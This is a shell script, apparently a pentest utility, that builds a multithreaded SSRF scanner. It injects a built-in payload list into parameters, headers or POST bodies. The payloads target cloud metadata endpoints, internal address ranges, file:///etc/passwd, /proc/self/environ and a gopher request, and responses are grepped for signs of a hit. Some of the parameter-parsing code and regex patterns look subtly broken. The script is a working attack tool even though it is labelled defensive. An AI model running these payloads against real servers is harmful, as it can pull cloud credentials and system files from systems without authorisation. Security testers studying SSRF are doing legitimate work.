cat > ssrf_scanner.sh <<'EOF'
#!/usr/bin/env bash
# ssrf_scanner.sh - Portable SSRF scanner (Bash)
# Usage example:
#   ./ssrf_scanner.sh --url "http://target.local/?url=http://example" --params url --payloads payloads.txt --threads 10 --proxy http://127.0.0.1:8080

set -euo pipefail
IFS=$'\n\t'

print_usage() {
  cat <<USAGE
ssrf_scanner.sh - Portable SSRF scanner (defensive testing only)

Usage:
  ./ssrf_scanner.sh --url URL [--params p1,p2] [--payloads file] [--threads N] [--proxy URL] [--method GET|POST] [--headers H1,H2] [--timeout SEC] [--outfile file] [--json]

Required:
  --url        Target URL (include scheme). If target already contains query params they'll be used if --params omitted.

Optional:
  --params     Comma-separated parameter names to test (e.g., url,redirect). If omitted, script tries to use existing query params.
  --payloads   File with one payload per line. If omitted, built-in payload list is used.
  --threads    Concurrency (default: 10).
  --proxy      HTTP proxy e.g. http://127.0.0.1:8080
  --method     GET or POST (default: GET). POST uses form data unless --json set.
  --headers    Comma-separated header names to inject payload into (e.g., X-Forwarded-For).
  --timeout    Request timeout seconds (default: 8).
  --outfile    CSV output filename (default: ssrf_results.csv).
  --json       If set and method=POST, send JSON body with param key: payload (requires jq).
  --help       Show this message.

Example:
  ./ssrf_scanner.sh --url 'http://vuln.app/?url=https://ok' --params url --payloads payloads.txt --threads 20 --proxy http://127.0.0.1:8080

USAGE
}

# Defaults
THREADS=10
TIMEOUT=8
OUTFILE="ssrf_results.csv"
METHOD="GET"
USE_JSON=0
PROXY=""
HEADER_LIST=""
PAYLOADS_FILE=""
PARAMS_CSV=""

# Built-in payloads
read -r -d '' DEFAULT_PAYLOADS <<'P' || true
http://127.0.0.1/
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://localhost/
http://[::1]/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/
http://10.0.0.1/
http://192.168.0.1/
http://172.16.0.1/
file:///etc/passwd
file:///proc/self/environ
gopher://127.0.0.1:70/_GET / HTTP/1.0%0D%0A%0D%0A
http://metadata.google.internal/computeMetadata/v1/
http://instance-data/latest/meta-data/
P

# Patterns to flag (extended grep -E)
SUSPICIOUS_PATTERNS='(169\.254\.169\.254|169254169254|instance-data|ec2\.metadata|metadata\.google|amazonaws\.com|internal|root:|passwd|\b127(\.\d{1,3}){3}\b|\b10(\.\d{1,3}){3}\b|\b192\.168(\.\d{1,3}){2}\b|\b172\.(1[6-9]|2[0-9]|3[0-1])(\.\d{1,3}){2}\b|Connection refused|Connection timed out|timed out|Name or service not known)'

# Parse args (simple)
if [[ $# -eq 0 ]]; then print_usage; exit 1; fi

while [[ $# -gt 0 ]]; do
  case "$1" in
    --url) TARGET_URL="$2"; shift 2 ;;
    --params) PARAMS_CSV="$2"; shift 2 ;;
    --payloads) PAYLOADS_FILE="$2"; shift 2 ;;
    --threads) THREADS="$2"; shift 2 ;;
    --proxy) PROXY="$2"; shift 2 ;;
    --method) METHOD="$(echo "$2" | tr '[:lower:]' '[:upper:]')"; shift 2 ;;
    --headers) HEADER_LIST="$2"; shift 2 ;;
    --timeout) TIMEOUT="$2"; shift 2 ;;
    --outfile) OUTFILE="$2"; shift 2 ;;
    --json) USE_JSON=1; shift ;;
    --help) print_usage; exit 0 ;;
    *) echo "Unknown option: $1"; print_usage; exit 2 ;;
  esac
done

# Basic prerequisites check
command -v curl >/dev/null 2>&1 || { echo "curl required. Install it and re-run."; exit 1; }
# parallel is optional; we'll fallback to xargs
command -v parallel >/dev/null 2>&1 || echo "[*] note: GNU parallel not found, using xargs for concurrency."

# Prepare payload list
PAYLOADS_TMP="$(mktemp)"
if [[ -n "$PAYLOADS_FILE" && -f "$PAYLOADS_FILE" ]]; then
  grep -v '^\s*#' "$PAYLOADS_FILE" | sed '/^\s*$/d' > "$PAYLOADS_TMP"
else
  printf "%s\n" "$DEFAULT_PAYLOADS" > "$PAYLOADS_TMP"
fi

# Determine params to test
PARAMS_TMP="$(mktemp)"
if [[ -n "$PARAMS_CSV" ]]; then
  echo "$PARAMS_CSV" | tr ',' '\n' | sed '/^\s*$/d' > "$PARAMS_TMP"
else
  # extract query params from TARGET_URL
  querypart="\$(echo \"$TARGET_URL\" | awk -F'?' '{print \$2}' || true)"
  if [[ \"$TARGET_URL\" =~ \\? ]]; then
    # parse keys
    echo "$TARGET_URL" | awk -F'?' '{print $2}' | tr '&' '\n' | sed 's/=.*//' | sed '/^\s*$/d' > \"$PARAMS_TMP\"
  else
    echo "url" > \"$PARAMS_TMP\"  # default param name fallback
  fi
fi

# Prepare CSV header
printf "timestamp,target,tested_param,payload,final_url,status,error,indicators,snippet\n" > "$OUTFILE"

# Function to URL-encode
urlencode() {
  # usage: urlencode "string"
  python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip(), safe=''))" <<<"$1"
}

# Worker function
worker() {
  local target="$1"
  local param="$2"
  local payload="$3"
  local method="$4"
  local headers_csv="$5"
  local timeout="$6"
  local proxy="$7"
  local use_json="$8"

  # Build final URL by replacing or adding query param
  # If target contains param, replace its value; otherwise append param=<payload>
  if echo "$target" | grep -qE "[?&]${param}="; then
    # replace existing param value (simple)
    final_url="$(echo "$target" | sed -E "s/([?&]${param}=)[^&]*/\\1$(urlencode "$payload")/g")"
  else
    sep="?"
    if echo "$target" | grep -qE "\\?"; then sep="&"; fi
    final_url="${target}${sep}${param}=$(urlencode "$payload")"
  fi

  # Prepare headers for curl
  header_args=()
  if [[ -n "$headers_csv" ]]; then
    IFS=',' read -r -a hdrs <<< "$headers_csv"
    for h in "${hdrs[@]}"; do
      header_args+=( -H "$h: $payload" )
    done
  fi

  # Proxy arg
  proxy_arg=()
  if [[ -n "$proxy" ]]; then
    proxy_arg=(--proxy "$proxy")
  fi

  # Choose curl command depending on method & json
  if [[ "$method" == "GET" ]]; then
    resp="$(curl -sS -i -L --max-time "$timeout" "${proxy_arg[@]}" -A "ssrf-scanner-bash/1.0" "${header_args[@]}" "$final_url" 2>&1 )"
    curl_exit=$?
    status="$(echo "$resp" | awk 'NR==1{print $2}' 2>/dev/null || echo "")"
  else
    if [[ "$use_json" -eq 1 ]]; then
      # requires jq to format JSON safely
      if ! command -v jq >/dev/null 2>&1; then
        echo "jq required for --json POST mode. Install jq or remove --json."
        exit 1
      fi
      json_body="$(jq -nc --arg v "$payload" '{('"$param"'): $v}')"
      resp="$(curl -sS -i -L --max-time "$timeout" "${proxy_arg[@]}" -A "ssrf-scanner-bash/1.0" -H "Content-Type: application/json" "${header_args[@]}" -d "$json_body" -X POST "$target" 2>&1)"
      curl_exit=$?
      status="$(echo "$resp" | awk 'NR==1{print $2}' 2>/dev/null || echo "")"
    else
      # form POST
      resp="$(curl -sS -i -L --max-time "$timeout" "${proxy_arg[@]}" -A "ssrf-scanner-bash/1.0" "${header_args[@]}" -d "${param}=${payload}" -X POST "$target" 2>&1)"
      curl_exit=$?
      status="$(echo "$resp" | awk 'NR==1{print $2}' 2>/dev/null || echo "")"
    fi
  fi

  timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
  error=""
  if [[ $curl_exit -ne 0 ]]; then
    error="curl_exit_${curl_exit}"
  fi

  # snippet
  snippet="$(echo "$resp" | tr '\n' ' ' | cut -c1-800 | sed 's/"/'\''/g')"

  # Indicators: check suspicious patterns
  indicators=""
  if echo "$resp" | grep -Ei "$SUSPICIOUS_PATTERNS" >/dev/null 2>&1; then
    matched="$(echo "$resp" | grep -Eio "$SUSPICIOUS_PATTERNS" | tr '\n' ';' | sed 's/;$//')"
    indicators="$matched"
  fi

  # Also flag common error strings
  if echo "$resp" | grep -Ei "Connection refused|Connection timed out|timed out|Name or service not known" >/dev/null 2>&1; then
    errm="$(echo "$resp" | grep -Eio 'Connection refused|Connection timed out|timed out|Name or service not known' | tr '\n' ';' | sed 's/;$//')"
    if [[ -n "$indicators" ]]; then
      indicators="${indicators};${errm}"
    else
      indicators="${errm}"
    fi
  fi

  # Write CSV line (escape fields)
  # timestamp,target,tested_param,payload,final_url,status,error,indicators,snippet
  printf '%s,"%s","%s","%s","%s","%s","%s","%s","%s"\n' \
    "$timestamp" "$(echo "$target" | sed 's/"/""/g')" "$(echo "$param" | sed 's/"/""/g')" \
    "$(echo "$payload" | sed 's/"/""/g')" "$(echo "$final_url" | sed 's/"/""/g')" \
    "$status" "$error" "$(echo "$indicators" | sed 's/"/""/g')" "$(echo "$snippet" | sed 's/"/""/g')" \
    >> "$OUTFILE"

  # Print suspicious to stdout for quick view
  if [[ -n "$indicators" || -n "$error" ]]; then
    echo "[$timestamp] SUSPICIOUS param=$param payload=$payload status=$status error=$error indicators=$indicators"
  fi
}

export -f worker
export SUSPICIOUS_PATTERNS
export OUTFILE

# Build job list file
JOBS_FILE="$(mktemp)"
while IFS= read -r param; do
  # skip empty
  [[ -z "$param" ]] && continue
  while IFS= read -r pl; do
    [[ -z "$pl" ]] && continue
    printf '%s\t%s\t%s\n' "$param" "$pl" "$TARGET_URL" >> "$JOBS_FILE"
  done < "$PAYLOADS_TMP"
done < "$PARAMS_TMP"

# Run jobs with parallel if available, else use xargs
if command -v parallel >/dev/null 2>&1; then
  # parallel expects export -f worker, pass param and payload; using placeholder replacement
  cat "$JOBS_FILE" | parallel -j "$THREADS" --colsep '\t' \
    worker "{3}" "{1}" "{2}" "$METHOD" "$HEADER_LIST" "$TIMEOUT" "$PROXY" "$USE_JSON"
else
  # xargs fallback (not as flexible, but workable)
  cat "$JOBS_FILE" | while IFS=$'\t' read -r param payload target; do
    # run background workers limited by THREADS
    while (( $(jobs -rp | wc -l) >= THREADS )); do sleep 0.1; done
    worker "$target" "$param" "$payload" "$METHOD" "$HEADER_LIST" "$TIMEOUT" "$PROXY" "$USE_JSON" &
  done
  wait
fi

echo "[+] Completed. Results saved to $OUTFILE"
# cleanup
rm -f "$PAYLOADS_TMP" "$PARAMS_TMP" "$JOBS_FILE"
EOF
